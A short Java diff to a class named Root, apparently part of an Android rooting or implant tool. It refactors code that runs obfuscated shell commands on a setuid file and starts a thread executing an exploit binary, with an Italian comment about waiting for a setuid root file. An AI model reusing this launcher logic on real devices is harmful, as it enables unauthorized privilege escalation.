@@ -302,9 +302,9 @@ public class Root {
 			Runtime.getRuntime().exec(Messages.getString("32.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
 			Runtime.getRuntime().exec(Messages.getString("32.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
 
-			final String exppath = path + "/" + exploit; //$NON-NLS-1$
+			String exppath = path + "/" + exploit; //$NON-NLS-1$
 
-			final ExploitRunnable r = new ExploitRunnable(exppath);
+			ExploitRunnable r = new ExploitRunnable(exppath);
 			new Thread(r).start();
 
 			// Attendiamo al max 100 secondi il nostro file setuid root
@@ -541,7 +541,7 @@ public class Root {
 	}
 
 	// Exploit thread
-	class ExploitRunnable implements Runnable {
+	static class ExploitRunnable implements Runnable {
 		private Process localProcess;
 		private final String exppath;
 
